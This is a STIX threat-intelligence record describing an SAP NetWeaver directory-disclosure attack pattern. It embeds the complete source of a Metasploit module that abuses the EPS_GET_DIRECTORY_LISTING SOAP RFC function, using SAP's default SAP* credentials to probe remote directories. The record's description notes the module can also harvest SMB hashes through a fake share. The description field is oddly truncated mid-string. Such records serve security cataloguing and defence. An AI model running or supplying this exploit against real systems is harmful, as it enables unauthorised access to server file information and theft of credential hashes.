{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--beae0d15-e793-4cc4-ac2d-c5da5977a653",
    "created": "2024-08-14T16:27:01.28935Z",
    "modified": "2024-08-14T16:27:01.289354Z",
    "name": "SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure",
    "description": " This module abuses the SAP NetWeaver EPS_GET_DIRECTORY_LISTING function, on the SAP SOAP RFC Service, to check for remote directory existence and get the number of entries on it. The module can also be used to capture SMB hashes by using a fake SMB share as DIR.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing.rb",
            "external_id": "sap_soap_rfc_eps_get_directory_listing.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure',\n      'Description' => %q{\n          This module abuses the SAP NetWeaver EPS_GET_DIRECTORY_LISTING function, on the\n        SAP SOAP RFC Service, to check for remote directory existence and get the number\n        of entries on it. The module can also be used to capture SMB hashes by using a fake\n        SMB share as DIR.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/' ]\n        ],\n      'Author' =>\n        [\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(8000),\n      OptString.new('CLIENT', [true, 'SAP Client', '001']),\n      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n      OptString.new('HttpPassword', [true, 'Password', '06071992']),\n      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])\n    ])\n  end\n\n  def run_host(ip)\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  '\n    data << 'xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  '\n    data << 'xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<SOAP-ENV:Header/>'\n    data << '<SOAP-ENV:Body>'\n    data << '<EPS_GET_DIRECTORY_LISTING xmlns=\"urn:sap-com:document:sap:rfc:functions\">'\n    data << '<DIR_NAME>' + datastore['DIR'] + '</DIR_NAME>'\n    data << '</EPS_GET_DIRECTORY_LISTING>'\n    data << '</SOAP-ENV:Body>'\n    data << '</SOAP-ENV:Envelope>'\n\n    begin\n      vprint_status(\"#{rhost}:#{rport} - Sending request to check #{datastore['DIR']}\")\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n        'ctype' => 'text/xml; charset=UTF-8',\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client' => datastore['CLIENT'],\n          'sap-language' => 'EN'\n        }\n      })\n      if res and res.code == 200 and res.body =~ /EPS_GET_DIRECTORY_LISTING\\.Response/ and res.body =~ /<FILE_COUNTER>(\\d*)<\\/FILE_COUNTER>/\n        file_count = $1\n        print_good(\"#{rhost}:#{rport} - #{file_count} files under #{datastore[\"DIR\"]}\")\n      else\n        vprint_error(\"#{rhost}:#{rport} - Error code: \" + res.code.to_s) if res\n        vprint_error(\"#{rhost}:#{rport} - Error message: \" + res.message.to_s) if res\n        vprint_error(\"#{rhost}:#{rport} - Error body: \" + res.body.to_s) if res and res.body\n      end\n      rescue ::Rex::ConnectionError\n        vprint_error(\"#{rhost}:#{rport} - Unable to connect\")\n        return\n      end\n    end\n  end\n",
    "x_mitre_contributors": [
        ""
    ]
}